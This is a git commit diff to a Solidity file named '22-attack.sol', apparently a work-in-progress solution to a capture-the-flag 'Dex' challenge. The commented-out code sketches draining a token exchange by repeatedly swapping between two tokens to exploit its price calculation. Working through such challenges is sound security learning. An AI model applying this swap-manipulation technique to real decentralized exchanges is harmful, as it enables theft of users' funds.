e0523606979d5d8c46ae5a54868ac6b949052716
sarobinson2001 <sarobinson2011@gmail.com>
2023-10-23 15:45:28 +0100

    updated 22-attack.sol

--- contracts/22-Dex/22-attack.sol
+++ contracts/22-Dex/22-attack.sol
@@ -14,6 +14,8 @@ contract Attack22 {
     }
 
     function attack() public {
+        address from = token1;
+        address to = token2;
         // 
     }
 
@@ -22,3 +24,24 @@ contract Attack22 {
 
 // Remember:  we need to approve the tokens for swap
 // and THEN perform the swaps
+
+/*
+    from = (from == token1) ? token2 : token1;
+    to = (to == token1) ? token2 : token1;
+
+    // how much we want to swap of token from (our entire balance, except for last iteration)
+    uint256 amount = dex.balanceOf(from, address(this));
+
+    // how much we will receive from the to token
+    uint256 amountReceived = dex.getSwapPrice(from, to, amount);
+    
+    // for the last iteration, if we swap our entire balance of token from the swap will revert 
+    // since the dex doesn't have enough of token to we need to determine how much to send to 
+    // empty the other token balance
+    
+    if (amountReceived > 110) {
+        amount = (amount * 110) / amountReceived; // swap amount to get the whole balance of the other token
+    }
+    
+    dex.swap(from, to, amount);
+*/
